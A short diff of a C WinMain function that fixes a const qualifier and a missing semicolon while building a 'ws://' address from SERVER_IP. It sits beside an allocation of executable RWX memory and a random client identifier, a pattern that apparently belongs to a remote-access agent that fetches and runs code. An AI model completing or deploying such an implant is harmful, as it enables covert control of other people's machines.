@@ -39,9 +39,9 @@ int WINAPI WinMain(
     PVOID mem = getMem(0x10000, PAGE_EXECUTE_READWRITE);
     scratchpad = getMem(0x100000, PAGE_READWRITE);
 
-    const char host[256] = "ws://";
+    char host[256] = "ws://";
 
-    strcat(host, SERVER_IP)
+    strcat(host, SERVER_IP);
 
     char identifier[37];
     random_uuid(identifier);
